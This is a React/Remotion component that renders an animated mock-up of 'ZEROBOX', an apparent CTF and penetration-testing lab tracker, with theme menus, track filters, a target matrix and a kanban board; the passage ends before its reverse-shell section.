import React from "react";
import {
  Terminal,
  Clock,
  Target,
  Shield,
  Crosshair,
  GraduationCap,
  Network,
  Kanban,
  Table,
  LayoutGrid,
  Search,
  Copy,
  Check,
  CheckCircle2,
  Flame,
  Lock,
  Moon,
  ChevronDown,
  Palette,
  FileText,
  BarChart3,
  Sparkles,
  SlidersHorizontal,
} from "lucide-react";
import { Img, staticFile } from "remotion";
import { ConfettiBurst } from "./ConfettiBurst";
import { THEME_PRESETS, ThemePreset } from "../styles/theme";
import { AttackGraphTopology } from "./AttackGraphShowcase";


export interface AuthenticZeroBoxUIProps {
  currentAct: 1 | 2 | 3 | 4 | 5 | 6;
  actProgress: number;
  timerSeconds: number;
  isTimerRunning: boolean;
  selectedTrack: "ALL" | "OSCP" | "CPTS" | "AD" | "REVSHELL" | "EXAM" | "AISCAN" | "ATTACKGRAPH";
  searchQuery: string;
  kanbanDragProgress: number;
  isRootPwned: boolean;
  confettiProgress: number;
  revShellHost: string;
  revShellPort: string;
  isPayloadCopied: boolean;
  examHoursLeft: number;
  examMinsLeft: number;
  radarExpansion: number;
  isCtaClicked?: boolean;
  showAiScanIntel?: boolean;
  showAttackGraph?: boolean;
  themePreset?: ThemePreset;
  isThemeDropdownOpen?: boolean;
  themeDropdownHighlight?: ThemePreset;
}

export const AuthenticZeroBoxUI: React.FC<AuthenticZeroBoxUIProps> = ({
  currentAct,
  actProgress,
  timerSeconds,
  isTimerRunning,
  selectedTrack,
  searchQuery,
  kanbanDragProgress,
  isRootPwned,
  confettiProgress,
  revShellHost,
  revShellPort,
  isPayloadCopied,
  examHoursLeft,
  examMinsLeft,
  radarExpansion,
  isCtaClicked = false,
  showAiScanIntel = false,
  showAttackGraph = false,
  themePreset = "oled",
  isThemeDropdownOpen = false,
  themeDropdownHighlight,
}) => {
  const tokens = THEME_PRESETS[themePreset];

  const formatTimer = (totalSec: number) => {
    const hrs = Math.floor(totalSec / 3600).toString().padStart(2, "0");
    const mins = Math.floor((totalSec % 3600) / 60).toString().padStart(2, "0");
    const secs = (totalSec % 60).toString().padStart(2, "0");
    return `${hrs}:${mins}:${secs}`;
  };

  return (
    <div
      style={{
        width: 1440,
        height: 880,
        backgroundColor: tokens.surfaceBase,
        borderRadius: 20,
        border: `1px solid ${tokens.borderSubtle}`,
        boxShadow: `0 40px 120px -20px rgba(0, 0, 0, 0.95), 0 0 0 1px ${tokens.borderSubtle}, 0 0 40px ${tokens.cyberAccentGlow}`,
        overflow: "hidden",
        display: "flex",
        flexDirection: "column",
        fontFamily: "Inter, -apple-system, BlinkMacSystemFont, sans-serif",
        position: "relative",
      }}
    >
      {/* ---------------------------------------------------- */}
      {/* 1. macOS Chrome Bar */}
      {/* ---------------------------------------------------- */}
      <div
        style={{
          height: 42,
          backgroundColor: tokens.windowBarBg,
          borderBottom: `1px solid ${tokens.borderSubtle}`,
          display: "flex",
          alignItems: "center",
          justifyContent: "space-between",
          padding: "0 20px",
          userSelect: "none",
          flexShrink: 0,
        }}
      >
        <div style={{ display: "flex", alignItems: "center", gap: 8 }}>
          <div style={{ width: 12, height: 12, borderRadius: "50%", backgroundColor: "#EF4444" }} />
          <div style={{ width: 12, height: 12, borderRadius: "50%", backgroundColor: "#F59E0B" }} />
          <div style={{ width: 12, height: 12, borderRadius: "50%", backgroundColor: tokens.cyberAccent }} />
        </div>

        {/* Minimalist URL Address Pill */}
        <div
          style={{
            display: "flex",
            alignItems: "center",
            gap: 8,
            backgroundColor: "rgba(255, 255, 255, 0.04)",
            padding: "4px 18px",
            borderRadius: 20,
            border: `1px solid ${tokens.borderSubtle}`,
            fontSize: 12,
            color: tokens.textMuted,
          }}
        >
          <Lock size={12} color={tokens.cyberAccent} />
          <span style={{ color: tokens.textPrimary, fontWeight: 600 }}>0xdnd.github.io/ctf-tracker/#/tracker</span>
        </div>

        <div style={{ display: "flex", alignItems: "center", gap: 8 }}>
          <span
            style={{
              fontSize: 11,
              color: tokens.cyberAccent,
              backgroundColor: tokens.cyberAccentBg,
              border: `1px solid ${tokens.cyberAccent}33`,
              padding: "3px 10px",
              borderRadius: 12,
              fontWeight: 700,
              display: "flex",
              alignItems: "center",
              gap: 5,
            }}
          >
            <Shield size={11} /> 100% Offline-First PWA
          </span>
        </div>
      </div>

      {/* ---------------------------------------------------- */}
      {/* 2. Authentic ZEROBOX Unified Header with 3D Box Logo */}
      {/* ---------------------------------------------------- */}
      <div
        id="unified-header"
        style={{
          height: 60,
          backgroundColor: tokens.headerBg,
          borderBottom: `1px solid ${tokens.borderSubtle}`,
          display: "flex",
          alignItems: "center",
          justifyContent: "space-between",
          padding: "0 22px",
          position: "relative",
          zIndex: 50,
          flexShrink: 0,
        }}
      >
        {/* Brand: 3D Blue Box Icon + Typography */}
        <div style={{ display: "flex", alignItems: "center", gap: 12 }}>
          <div
            style={{
              width: 38,
              height: 38,
              borderRadius: 10,
              backgroundColor: "rgba(56, 189, 248, 0.08)",
              border: `1px solid ${tokens.cyberAccent}55`,
              display: "flex",
              alignItems: "center",
              justifyContent: "center",
              boxShadow: `0 0 16px ${tokens.cyberAccentGlow}`,
              overflow: "hidden",
            }}
          >
            <Img
              src={staticFile("brand/logo-oled.webp")}
              style={{
                width: 32,
                height: 32,
                objectFit: "contain",
                filter: "drop-shadow(0 0 8px rgba(56, 189, 248, 0.9))",
              }}
            />
          </div>
          <div>
            <div style={{ display: "flex", alignItems: "center", gap: 8 }}>
              <span style={{ fontSize: 16, fontWeight: 900, color: tokens.textPrimary, letterSpacing: "0.04em" }}>
                ZEROBOX
              </span>
              <span style={{ fontSize: 10, color: tokens.cyberAccent, fontWeight: 700, backgroundColor: tokens.cyberAccentBg, padding: "1px 6px", borderRadius: 4, border: `1px solid ${tokens.cyberAccent}33` }}>
                v2.0 STABLE
              </span>
            </div>
            <div style={{ fontSize: 11, color: tokens.textMuted }}>Offensive Security Operations & Tracker</div>
          </div>
        </div>

        {/* Center: Active Target HUD */}
        <div
          id="active-target-hud"
          style={{
            display: "flex",
            alignItems: "center",
            gap: 12,
            backgroundColor: tokens.hudBg,
            border: isRootPwned
              ? `1px solid ${tokens.cyberAccent}`
              : `1px solid ${tokens.hudBorder}`,
            borderRadius: 12,
            padding: "5px 16px",
            boxShadow: isRootPwned
              ? `0 0 20px ${tokens.cyberAccentGlow}`
              : `0 0 12px ${tokens.cyberAccentBg}`,
          }}
        >
          <div
            style={{
              width: 8,
              height: 8,
              borderRadius: "50%",
              backgroundColor: isRootPwned ? tokens.cyberAccent : "#38BDF8",
              boxShadow: `0 0 8px ${isRootPwned ? tokens.cyberAccent : "#38BDF8"}`,
            }}
          />
          <div style={{ display: "flex", flexDirection: "column" }}>
            <div style={{ display: "flex", alignItems: "center", gap: 8 }}>
              <span style={{ fontSize: 12, fontWeight: 700, color: tokens.textPrimary }}>
                TARGET: 10.10.11.224 [Sau]
              </span>
              <span
                style={{
                  fontSize: 10,
                  backgroundColor: tokens.cyberAccentBg,
                  color: tokens.cyberAccent,
                  padding: "1px 6px",
                  borderRadius: 6,
                  fontWeight: 600,
                  border: `1px solid ${tokens.cyberAccent}33`,
                }}
              >
                Linux · Easy
              </span>
            </div>
            <span style={{ fontSize: 10, color: isRootPwned ? tokens.cyberAccent : "#38BDF8", fontWeight: 600 }}>
              {isRootPwned ? "PWNED 100% // ALL FLAGS CAPTURED" : "STATUS: RECON & FOOTHOLD IN PROGRESS"}
            </span>
          </div>
        </div>

        {/* Right: Theme Dropdown, Stopwatch, Labs Count */}
        <div style={{ display: "flex", alignItems: "center", gap: 12, position: "relative" }}>
          {/* Authentic Theme Preset Dropdown Pill */}
          <div style={{ position: "relative" }}>
            <div
              id="theme-preset-dropdown-pill"
              style={{
                display: "flex",
                alignItems: "center",
                gap: 8,
                backgroundColor: isThemeDropdownOpen ? tokens.surfaceHover : tokens.surfaceCard,
                border: isThemeDropdownOpen
                  ? `1px solid ${tokens.cyberAccent}`
                  : `1px solid ${tokens.borderSubtle}`,
                padding: "5px 12px",
                borderRadius: 10,
                cursor: "pointer",
                boxShadow: isThemeDropdownOpen
                  ? `0 0 16px ${tokens.cyberAccentGlow}`
                  : "0 2px 6px rgba(0,0,0,0.2)",
              }}
            >
              <div style={{ color: tokens.cyberAccent, display: "flex", alignItems: "center" }}>
                <Img src={staticFile("brand/logo-oled.webp")} style={{ width: 14, height: 14, objectFit: "contain" }} />
              </div>
              <span style={{ fontSize: 11, fontWeight: 700, color: tokens.textPrimary }}>
                {tokens.name}
              </span>
              <div
                style={{
                  width: 7,
                  height: 7,
                  borderRadius: "50%",
                  backgroundColor: tokens.borderAccent,
                  boxShadow: `0 0 6px ${tokens.borderAccent}`,
                }}
              />
              <ChevronDown
                size={12}
                color={tokens.textMuted}
                style={{
                  transform: isThemeDropdownOpen ? "rotate(180deg)" : "rotate(0deg)",
                }}
              />
              <div
                style={{
                  display: "flex",
                  alignItems: "center",
                  justifyContent: "center",
                  width: 18,
                  height: 18,
                  borderRadius: 5,
                  backgroundColor: "rgba(255, 255, 255, 0.08)",
                  marginLeft: 2,
                }}
              >
                <Moon size={10} color={tokens.textSecondary} />
              </div>
            </div>

            {/* Dropdown Floating Popover Menu */}
            {isThemeDropdownOpen && (
              <div
                id="theme-dropdown-menu"
                style={{
                  position: "absolute",
                  top: 40,
                  right: 0,
                  width: 275,
                  backgroundColor: tokens.surfaceCard,
                  border: `1px solid ${tokens.borderStrong}`,
                  borderRadius: 12,
                  boxShadow: `0 16px 40px rgba(0, 0, 0, 0.85), 0 0 24px ${tokens.cyberAccentGlow}`,
                  padding: 8,
                  zIndex: 100,
                  display: "flex",
                  flexDirection: "column",
                  gap: 4,
                }}
              >
                <div
                  style={{
                    padding: "4px 8px 6px 8px",
                    fontSize: 10,
                    fontWeight: 800,
                    letterSpacing: "0.08em",
                    color: tokens.textMuted,
                    display: "flex",
                    alignItems: "center",
                    gap: 6,
                    borderBottom: `1px solid ${tokens.borderSubtle}`,
                    marginBottom: 4,
                  }}
                >
                  <Palette size={11} />
                  <span>THEME PRESETS</span>
                </div>

                {[
                  {
                    id: "oled" as ThemePreset,
                    name: "OLED Black / Electric Blue",
                    tagline: "True pitch OLED black & electric sky blue",
                    color: "#38bdf8",
                  },
                  {
                    id: "obsidian" as ThemePreset,
                    name: "Obsidian Dark / Zinc",
                    tagline: "Cold zinc dark and clean zinc slate",
                    color: "#0ea5e9",
                  },
                  {
                    id: "monolith" as ThemePreset,
                    name: "Clean Monolith",
                    tagline: "Architectural off-white & crisp graphite",
                    color: "#38bdf8",
                  },
                  {
                    id: "htb" as ThemePreset,
                    name: "Hack The Box",
                    tagline: "OLED black and official HTB lime",
                    color: "#9fef00",
                  },
                ].map((opt) => {
                  const isSelected = themePreset === opt.id;
                  const isHighlighted = themeDropdownHighlight === opt.id;

                  return (
                    <div
                      key={opt.id}
                      style={{
                        display: "flex",
                        alignItems: "center",
                        justifyContent: "space-between",
                        padding: "8px 10px",
                        borderRadius: 8,
                        backgroundColor: isHighlighted
                          ? tokens.surfaceHover
                          : isSelected
                          ? "rgba(255, 255, 255, 0.05)"
                          : "transparent",
                        border: isHighlighted
                          ? `1px solid ${opt.color}88`
                          : isSelected
                          ? `1px solid ${opt.color}44`
                          : "1px solid transparent",
                        cursor: "pointer",
                      }}
                    >
                      <div style={{ display: "flex", alignItems: "center", gap: 10 }}>
                        <div
                          style={{
                            width: 24,
                            height: 24,
                            borderRadius: 6,
                            backgroundColor: `${opt.color}22`,
                            display: "flex",
                            alignItems: "center",
                            justifyContent: "center",
                            color: opt.color,
                          }}
                        >
                          <div style={{ width: 8, height: 8, borderRadius: "50%", backgroundColor: opt.color }} />
                        </div>
                        <div style={{ display: "flex", flexDirection: "column" }}>
                          <span style={{ fontSize: 11, fontWeight: 700, color: tokens.textPrimary }}>
                            {opt.name}
                          </span>
                          <span style={{ fontSize: 9, color: tokens.textMuted }}>
                            {opt.tagline}
                          </span>
                        </div>
                      </div>
                      {isSelected && <Check size={14} color={opt.color} />}
                    </div>
                  );
                })}
              </div>
            )}
          </div>

          {/* Live Attack Stopwatch */}
          <div
            id="stopwatch-button"
            style={{
              display: "flex",
              alignItems: "center",
              gap: 8,
              backgroundColor: isTimerRunning ? tokens.cyberAccentBg : "rgba(255, 255, 255, 0.05)",
              border: isTimerRunning
                ? `1px solid ${tokens.cyberAccent}66`
                : `1px solid ${tokens.borderSubtle}`,
              padding: "5px 13px",
              borderRadius: 10,
              cursor: "pointer",
            }}
          >
            <Clock size={13} color={isTimerRunning ? tokens.cyberAccent : tokens.textMuted} />
            <span
              style={{
                fontFamily: "monospace",
                fontSize: 12,
                fontWeight: 700,
                color: isTimerRunning ? tokens.cyberAccent : tokens.textPrimary,
                fontVariantNumeric: "tabular-nums",
              }}
            >
              {formatTimer(timerSeconds)}
            </span>
            <div
              style={{
                width: 6,
                height: 6,
                borderRadius: "50%",
                backgroundColor: isTimerRunning ? tokens.cyberAccent : tokens.textMuted,
              }}
            />
          </div>

          {/* Catalog stats */}
          <div style={{ display: "flex", alignItems: "center", gap: 8, fontSize: 11, color: tokens.textMuted }}>
            <span style={{ color: tokens.textPrimary, fontWeight: 700 }}>929</span> Labs
            <span style={{ color: tokens.borderStrong }}>|</span>
            <span style={{ color: tokens.cyberAccent, fontWeight: 700 }}>55</span> Solves
          </div>
        </div>
      </div>

      {/* ---------------------------------------------------- */}
      {/* 3. Pathways Track Bar & Search Input */}
      {/* ---------------------------------------------------- */}
      <div
        style={{
          height: 44,
          backgroundColor: tokens.trackBarBg,
          borderBottom: `1px solid ${tokens.borderSubtle}`,
          display: "flex",
          alignItems: "center",
          justifyContent: "space-between",
          padding: "0 22px",
          flexShrink: 0,
        }}
      >
        <div style={{ display: "flex", alignItems: "center", gap: 8 }}>
          {[
            { id: "ALL", label: "All Targets (929)", icon: Target, color: tokens.borderAccent },
            { id: "OSCP", label: "OSCP Track", icon: GraduationCap, color: "#F59E0B" },
            { id: "CPTS", label: "CPTS Path (Official)", icon: Crosshair, color: tokens.cyberAccent },
            { id: "AD", label: "Active Directory", icon: Network, color: "#A855F7" },
            { id: "REVSHELL", label: "RevShell Studio", icon: Terminal, color: "#06B6D4" },
            { id: "EXAM", label: "Exam 24h Simulator", icon: Flame, color: "#EC4899" },
          ].map((track) => {
            const isActive = selectedTrack === track.id;
            const Icon = track.icon;
            return (
              <div
                key={track.id}
                id={`pill-track-${track.id.toLowerCase()}`}
                style={{
                  display: "flex",
                  alignItems: "center",
                  gap: 6,
                  padding: "4px 10px",
                  borderRadius: 7,
                  backgroundColor: isActive ? `${track.color}25` : "rgba(255, 255, 255, 0.04)",
                  border: isActive ? `1px solid ${track.color}` : `1px solid ${tokens.borderSubtle}`,
                  color: isActive ? tokens.textPrimary : tokens.textMuted,
                  fontSize: 11,
                  fontWeight: isActive ? 700 : 500,
                  boxShadow: isActive ? `0 0 10px ${track.color}44` : "none",
                }}
              >
                <Icon size={12} color={isActive ? track.color : tokens.textMuted} />
                <span>{track.label}</span>
              </div>
            );
          })}
        </div>

        <div style={{ display: "flex", alignItems: "center", gap: 10 }}>
          <div
            id="search-input-box"
            style={{
              display: "flex",
              alignItems: "center",
              gap: 8,
              backgroundColor: tokens.surfaceCard,
              border: searchQuery ? `1px solid ${tokens.cyberAccent}` : `1px solid ${tokens.borderSubtle}`,
              borderRadius: 8,
              padding: "4px 12px",
              width: 230,
            }}
          >
            <Search size={12} color={searchQuery ? tokens.cyberAccent : tokens.textMuted} />
            <span
              style={{
                fontSize: 11,
                fontFamily: "monospace",
                color: searchQuery ? tokens.cyberAccent : tokens.textMuted,
              }}
            >
              {searchQuery || "Search target, CVE, service..."}
            </span>
          </div>

          <div
            style={{
              display: "flex",
              alignItems: "center",
              backgroundColor: "rgba(255, 255, 255, 0.04)",
              borderRadius: 8,
              padding: 2,
              border: `1px solid ${tokens.borderSubtle}`,
            }}
          >
            <div
              style={{
                padding: "3px 8px",
                borderRadius: 6,
                backgroundColor: currentAct === 3 ? tokens.cyberAccentBg : "transparent",
                color: currentAct === 3 ? tokens.cyberAccent : tokens.textMuted,
                display: "flex",
                alignItems: "center",
              }}
            >
              <Kanban size={12} />
            </div>
            <div style={{ padding: "3px 8px", borderRadius: 6, color: tokens.textMuted, display: "flex", alignItems: "center" }}>
              <LayoutGrid size={12} />
            </div>
            <div style={{ padding: "3px 8px", borderRadius: 6, color: tokens.textMuted, display: "flex", alignItems: "center" }}>
              <Table size={12} />
            </div>
          </div>
        </div>
      </div>

      {/* ---------------------------------------------------- */}
      {/* 4. Body Layout: Left Sidebar + Main Workstation */}
      {/* ---------------------------------------------------- */}
      <div style={{ display: "flex", flex: 1, overflow: "hidden" }}>
        {/* Left Navigation Rail (1:1 with authentic ZEROBOX Cockpit) */}
        <div
          style={{
            width: 54,
            backgroundColor: tokens.windowBarBg,
            borderRight: `1px solid ${tokens.borderSubtle}`,
            display: "flex",
            flexDirection: "column",
            alignItems: "center",
            padding: "14px 0",
            gap: 14,
            flexShrink: 0,
          }}
        >
          {[
            { icon: Target, active: currentAct === 1 || currentAct === 2, label: "Matrix" },
            { icon: Kanban, active: currentAct === 3, label: "Kanban" },
            { icon: Terminal, active: currentAct === 4 && !showAiScanIntel, label: "RevShell" },
            { icon: Sparkles, active: showAiScanIntel, label: "AI Intel" },
            { icon: Network, active: currentAct === 5 && showAttackGraph, label: "Graph" },
            { icon: Flame, active: currentAct === 5 && !showAttackGraph, label: "Exam 24h" },
            { icon: FileText, active: false, label: "Vault" },
            { icon: BarChart3, active: false, label: "Stats" },
          ].map((item, idx) => {
            const Icon = item.icon;
            return (
              <div
                key={idx}
                style={{
                  width: 36,
                  height: 36,
                  borderRadius: 9,
                  display: "flex",
                  alignItems: "center",
                  justifyContent: "center",
                  backgroundColor: item.active ? tokens.cyberAccentBg : "transparent",
                  border: item.active ? `1px solid ${tokens.cyberAccent}66` : "1px solid transparent",
                  color: item.active ? tokens.cyberAccent : tokens.textMuted,
                  boxShadow: item.active ? `0 0 12px ${tokens.cyberAccentGlow}` : "none",
                }}
              >
                <Icon size={17} />
              </div>
            );
          })}
        </div>

        {/* Dynamic Center Workstation Viewport */}
        <div
          style={{
            flex: 1,
            backgroundColor: tokens.surfaceBase,
            position: "relative",
            overflow: "hidden",
            display: "flex",
            flexDirection: "column",
            padding: 14,
            gap: 10,
          }}
        >
          {/* ==================================================== */}
          {/* ACT 1 & 2: Dense 9-Machine Matrix + Authentic Badges */}
          {/* ==================================================== */}
          {(currentAct === 1 || currentAct === 2) && (
            <div style={{ display: "flex", flexDirection: "column", height: "100%", gap: 8 }}>
              {/* Secondary Filter & View Toolbar (1:1 with authentic ZEROBOX) */}
              <div
                style={{
                  display: "flex",
                  alignItems: "center",
                  justifyContent: "space-between",
                  backgroundColor: tokens.surfaceCard,
                  padding: "5px 10px",
                  borderRadius: 8,
                  border: `1px solid ${tokens.borderSubtle}`,
                  fontSize: 10,
                  flexShrink: 0,
                }}
              >
                {/* Filter Pills */}
                <div style={{ display: "flex", alignItems: "center", gap: 5 }}>
                  {[
                    { label: "All", count: 929, active: true },
                    { label: "Unsolved", count: 856, active: false },
                    { label: "Foothold", count: 18, active: false },
                    { label: "Pwned", count: 55, active: false },
                  ].map((f, i) => (
                    <div
                      key={i}
                      style={{
                        padding: "3px 8px",
                        borderRadius: 5,
                        backgroundColor: f.active ? tokens.cyberAccentBg : "transparent",
                        border: f.active ? `1px solid ${tokens.cyberAccent}66` : "1px solid transparent",
                        color: f.active ? tokens.cyberAccent : tokens.textMuted,
                        fontWeight: f.active ? 700 : 500,
                        cursor: "pointer",
                      }}
                    >
                      <span>{f.label}</span>
                      <span style={{ marginLeft: 3, opacity: 0.65, fontSize: 9 }}>({f.count})</span>
                    </div>
                  ))}
                </div>

                {/* Actions: Filters, Sorting, Views */}
                <div style={{ display: "flex", alignItems: "center", gap: 7 }}>
                  <div
                    style={{
                      display: "flex",
                      alignItems: "center",
                      gap: 4,
                      backgroundColor: "rgba(255, 255, 255, 0.04)",
                      padding: "3px 7px",
                      borderRadius: 5,
                      color: tokens.textSecondary,
                      border: `1px solid ${tokens.borderSubtle}`,
                    }}
                  >
                    <SlidersHorizontal size={10} />
                    <span>Filters</span>
                  </div>
                  <div
                    style={{
                      display: "flex",
                      alignItems: "center",
                      gap: 4,
                      backgroundColor: "rgba(255, 255, 255, 0.04)",
                      padding: "3px 7px",
                      borderRadius: 5,
                      color: tokens.textSecondary,
                      border: `1px solid ${tokens.borderSubtle}`,
                    }}
                  >
                    <span>Randomized</span>
                    <ChevronDown size={10} />
                  </div>
                  <div
                    style={{
                      display: "flex",
                      alignItems: "center",
                      backgroundColor: tokens.surfaceSunken,
                      padding: "2px",
                      borderRadius: 5,
                      border: `1px solid ${tokens.borderSubtle}`,
                      gap: 2,
                    }}
                  >
                    <div style={{ padding: "2px 5px", borderRadius: 4, backgroundColor: tokens.cyberAccentBg, color: tokens.cyberAccent }}>
                      <LayoutGrid size={11} />
                    </div>
                    <div style={{ padding: "2px 5px", borderRadius: 4, color: tokens.textMuted }}>
                      <Table size={11} />
                    </div>
                    <div style={{ padding: "2px 5px", borderRadius: 4, color: tokens.textMuted }}>
                      <Kanban size={11} />
                    </div>
                  </div>
                </div>
              </div>

              {/* Authentic Target Inventory Table from actual project (table-1938.webp) */}
              <div
                style={{
                  flex: 1,
                  position: "relative",
                  borderRadius: 12,
                  border: `1px solid ${tokens.borderSubtle}`,
                  backgroundColor: tokens.surfaceCard,
                  overflow: "hidden",
                  boxShadow: "0 10px 30px rgba(0, 0, 0, 0.6)",
                  display: "flex",
                  flexDirection: "column",
                }}
              >
                <Img
                  src={staticFile("images/landing/table-1938.webp")}
                  style={{
                    width: "100%",
                    height: "100%",
                    objectFit: "cover",
                    objectPosition: "top center",
                    filter: "contrast(1.05) brightness(1.02)",
                  }}
                />

                {/* Living Dynamic Selection Overlay for Sequel row (10.129.1.7) */}
                <div
                  style={{
                    position: "absolute",
                    top: "22.6%",
                    left: "0.8%",
                    right: "0.8%",
                    height: "10.8%",
                    borderRadius: 8,
                    border: `1.5px solid ${tokens.cyberAccent}`,
                    backgroundColor: tokens.cyberAccentBg,
                    boxShadow: `0 0 24px ${tokens.cyberAccentGlow}`,
                    pointerEvents: "none",
                    opacity: currentAct === 2 && actProgress > 0.35 ? 0.95 : 0,
                    transition: "opacity 0.2s ease",
                    display: "flex",
                    alignItems: "center",
                    justifyContent: "flex-end",
                    paddingRight: 20,
                  }}
                >
                  <span
                    style={{
                      backgroundColor: tokens.cyberAccent,
                      color: "#000000",
                      fontSize: 10,
                      fontWeight: 800,
                      fontFamily: "monospace",
                      padding: "3px 9px",
                      borderRadius: 4,
                      boxShadow: `0 0 12px ${tokens.cyberAccentGlow}`,
                    }}
                  >
                    ACTIVE TARGET SELECTED
                  </span>
                </div>

                {/* Tactical Search Query Indicator */}
                {searchQuery && (
                  <div
                    style={{
                      position: "absolute",
                      top: 12,
                      right: 18,
                      backgroundColor: tokens.surfaceElevated,
                      border: `1px solid ${tokens.cyberAccent}`,
                      borderRadius: 6,
                      padding: "4px 10px",
                      fontSize: 10,
                      fontFamily: "monospace",
                      color: tokens.cyberAccent,
                      boxShadow: `0 0 15px ${tokens.cyberAccentGlow}`,
                      display: "flex",
                      alignItems: "center",
                      gap: 6,
                    }}
                  >
                    <Search size={10} />
                    <span>Filtering: "{searchQuery}" (Match: 57 items)</span>
                  </div>
                )}
              </div>

              {/* Bottom Dense Status Strip */}
              <div
                style={{
                  height: 32,
                  backgroundColor: tokens.surfaceCard,
                  borderRadius: 7,
                  border: `1px solid ${tokens.borderSubtle}`,
                  display: "flex",
                  alignItems: "center",
                  justifyContent: "space-between",
                  padding: "0 12px",
                  fontSize: 10,
                  color: tokens.textMuted,
                  flexShrink: 0,
                }}
              >
                <div style={{ display: "flex", alignItems: "center", gap: 10 }}>
                  <span style={{ color: tokens.textPrimary, fontWeight: 700 }}>929 targets indexed</span>
                  <span style={{ color: tokens.borderStrong }}>•</span>
                  <span style={{ color: tokens.cyberAccent, fontWeight: 700 }}>55 pwned (100% root loot stored)</span>
                  <span style={{ color: tokens.borderStrong }}>•</span>
                  <span>18 in active engagement</span>
                </div>
                <div style={{ display: "flex", alignItems: "center", gap: 8, fontFamily: "monospace" }}>
                  <span>j/k: navigate</span>
                  <span style={{ color: tokens.borderStrong }}>|</span>
                  <span>space: quick view</span>
                  <span style={{ color: tokens.borderStrong }}>|</span>
                  <span>/: filter</span>
                </div>
              </div>
            </div>
          )}

          {/* ==================================================== */}
          {/* ACT 3: Authentic Kanban Board from Actual Project (hero-app-1575.webp) */}
          {/* ==================================================== */}
          {currentAct === 3 && (
            <div style={{ display: "flex", flexDirection: "column", height: "100%", gap: 8, position: "relative" }}>
              {/* Kanban Frame with Authentic hero-app-1575.webp Capture */}
              <div
                style={{
                  flex: 1,
                  position: "relative",
                  borderRadius: 12,
                  border: `1px solid ${tokens.borderSubtle}`,
                  backgroundColor: tokens.surfaceCard,
                  overflow: "hidden",
                  boxShadow: "0 10px 30px rgba(0, 0, 0, 0.6)",
                  display: "flex",
                  flexDirection: "column",
                }}
              >
                <Img
                  src={staticFile("images/landing/hero-app-1575.webp")}
                  style={{
                    width: "100%",
                    height: "100%",
                    objectFit: "cover",
                    objectPosition: "top right",
                    filter: "contrast(1.05) brightness(1.02)",
                  }}
                />

                {/* Confetti Explosion on Root Pwn Drop */}
                {isRootPwned && confettiProgress > 0 && (
                  <ConfettiBurst progress={confettiProgress} />
                )}

                {/* Living Dragged Card Overlay: Three (10.129.1.14) */}
                {kanbanDragProgress > 0 && !isRootPwned && (
                  <div
                    style={{
                      position: "absolute",
                      left: `calc(23% + (48% * ${kanbanDragProgress}))`,
                      top: `calc(48% + (sin(${kanbanDragProgress} * 3.14159) * -35px))`,
                      width: 260,
                      backgroundColor: "rgba(10, 14, 22, 0.96)",
                      border: `2px solid ${tokens.cyberAccent}`,
                      borderRadius: 10,
                      padding: "10px 14px",
                      boxShadow: `0 20px 40px rgba(0, 0, 0, 0.9), 0 0 30px ${tokens.cyberAccentGlow}`,
                      transform: `rotate(${kanbanDragProgress * 4 - 2}deg) scale(1.05)`,
                      zIndex: 100,
                      pointerEvents: "none",
                      display: "flex",
                      flexDirection: "column",
                      gap: 6,
                    }}
                  >
                    <div style={{ display: "flex", alignItems: "center", justifyContent: "space-between" }}>
                      <div style={{ display: "flex", alignItems: "center", gap: 6 }}>
                        <div style={{ width: 8, height: 8, borderRadius: "50%", backgroundColor: "#F59E0B" }} />
                        <span style={{ fontSize: 13, fontWeight: 800, color: tokens.textPrimary }}>Three</span>
                      </div>
                      <span
                        style={{
                          fontSize: 9,
                          fontFamily: "monospace",
                          color: tokens.cyberAccent,
                          backgroundColor: tokens.cyberAccentBg,
                          padding: "2px 6px",
                          borderRadius: 4,
                          fontWeight: 700,
                        }}
                      >
                        MOVING TO PWNED
                      </span>
                    </div>

                    <div
                      style={{
                        backgroundColor: tokens.surfaceSunken,
                        padding: "4px 8px",
                        borderRadius: 5,
                        fontFamily: "monospace",
                        fontSize: 11,
                        color: tokens.textSecondary,
                        border: `1px solid ${tokens.borderSubtle}`,
                      }}
                    >
                      10.129.1.14
                    </div>

                    <div style={{ display: "flex", gap: 4, alignItems: "center" }}>
                      <span
                        style={{
                          fontSize: 9,
                          backgroundColor: "rgba(234, 88, 12, 0.2)",
                          color: "#FB923C",
                          padding: "1px 6px",
                          borderRadius: 4,
                          fontWeight: 700,
                        }}
                      >
                        🐧 Linux
                      </span>
                      <span
                        style={{
                          fontSize: 9,
                          backgroundColor: "rgba(56, 189, 248, 0.2)",
                          color: "#38BDF8",
                          padding: "1px 6px",
                          borderRadius: 4,
                          fontWeight: 700,
                        }}
                      >
                        Very Easy
                      </span>
                      <span style={{ fontSize: 9, color: tokens.textMuted }}>+1</span>
                    </div>
                  </div>
                )}

                {/* Root Pwned Success Banner across Completed Column */}
                {isRootPwned && (
                  <div
                    style={{
                      position: "absolute",
                      top: "22%",
                      right: "6%",
                      width: "36%",
                      backgroundColor: "rgba(10, 20, 15, 0.95)",
                      border: `2px solid ${tokens.cyberAccent}`,
                      borderRadius: 12,
                      padding: "16px 20px",
                      boxShadow: `0 0 40px ${tokens.cyberAccentGlow}`,
                      display: "flex",
                      alignItems: "center",
                      gap: 14,
                      zIndex: 90,
                    }}
                  >
                    <div
                      style={{
                        width: 36,
                        height: 36,
                        borderRadius: "50%",
                        backgroundColor: tokens.cyberAccentBg,
                        border: `2px solid ${tokens.cyberAccent}`,
                        display: "flex",
                        alignItems: "center",
                        justifyContent: "center",
                      }}
                    >
                      <CheckCircle2 size={20} color={tokens.cyberAccent} />
                    </div>
                    <div>
                      <div style={{ fontSize: 13, fontWeight: 900, color: tokens.textPrimary }}>
                        TARGET SECURED · ROOT PWNED!
                      </div>
                      <div style={{ fontSize: 10, color: tokens.cyberAccent, fontFamily: "monospace", marginTop: 2 }}>
                        Three (10.129.1.14) → Loot Stored in Encrypted Vault
                      </div>
                    </div>
                  </div>
                )}
              </div>

              {/* Kanban Bottom Analytics Rail */}
              <div
                style={{
                  height: 30,
                  backgroundColor: tokens.surfaceCard,
                  borderRadius: 7,
                  border: `1px solid ${tokens.borderSubtle}`,
                  display: "flex",
                  alignItems: "center",
                  justifyContent: "space-between",
                  padding: "0 12px",
                  fontSize: 10,
                  color: tokens.textMuted,
                  flexShrink: 0,
                }}
              >
                <span>Tactical Engagement Velocity: 3.4 hrs / Pwned Machine</span>
                <span style={{ color: tokens.cyberAccent, fontWeight: 700 }}>
                  CPTS Path Milestone: 58 / 70 Targets Secured (83%)
                </span>
              </div>
            </div>
          )}

          {/* ACT 4: Dense Split Workstation (RevShell + AI Recon) */}
